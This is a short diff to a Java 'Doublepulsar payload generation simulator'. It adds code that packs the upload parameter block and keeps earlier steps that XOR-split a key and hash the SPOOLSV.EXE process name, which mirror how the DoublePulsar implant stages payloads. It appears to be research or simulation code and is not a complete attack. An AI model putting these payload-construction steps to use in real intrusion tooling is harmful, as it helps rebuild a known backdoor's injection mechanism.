@@ -1,3 +1,6 @@
+import java.nio.*;
+import java.util.*;
+
 /*
 Doublepulsar payload generation simulator
 */
@@ -65,7 +68,6 @@ public class DoublepulsarUploadShellcode {
         byteXorKey[2] = (byte) ((xorKey >> 16) & 0xFF);
         byteXorKey[3] = (byte) ((xorKey >> 24) & 0xFF);
 		
-		
 		// Create a buffer of 4096 bytes
         byte[] buffer = new byte[4096];
 
@@ -83,13 +85,32 @@ public class DoublepulsarUploadShellcode {
 		
 		// Optional: print the first few bytes to verify
         for (int i = 0; i < 12; i++) {
-            System.out.printf("buffer[%d] = 0x%02X%n", i, XorBytes[i]);
+            System.out.printf("Xored bytes buffer[%d] = 0x%02X%n", i, XorBytes[i]);
         }
         
         String procName = "SPOOLSV.EXE";
         int hash = generateProcessHash(procName);
         System.out.printf("Process Hash for %s: 0x%08X%n", procName, hash);
-    
-    }
+        
+        
+        ByteBuffer parameters = ByteBuffer.allocate(12);
+        parameters.order(ByteOrder.LITTLE_ENDIAN);
 
+        // First 4 bytes: 0x50D800
+        parameters.putInt(0x0050D800); // Note: 0x50D800 fits into 4 bytes
+
+        // Second 4 bytes: 4096
+        parameters.putInt(4096);
+
+        // Last 4 bytes: 0
+        parameters.putInt(0);
+
+        // Get the byte array
+        byte[] byteArray = parameters.array();
+
+        // Print the byte array in hex to verify
+        for (byte b : byteArray) {
+            System.out.printf("%02X ", b);
+        }
+    }
 }
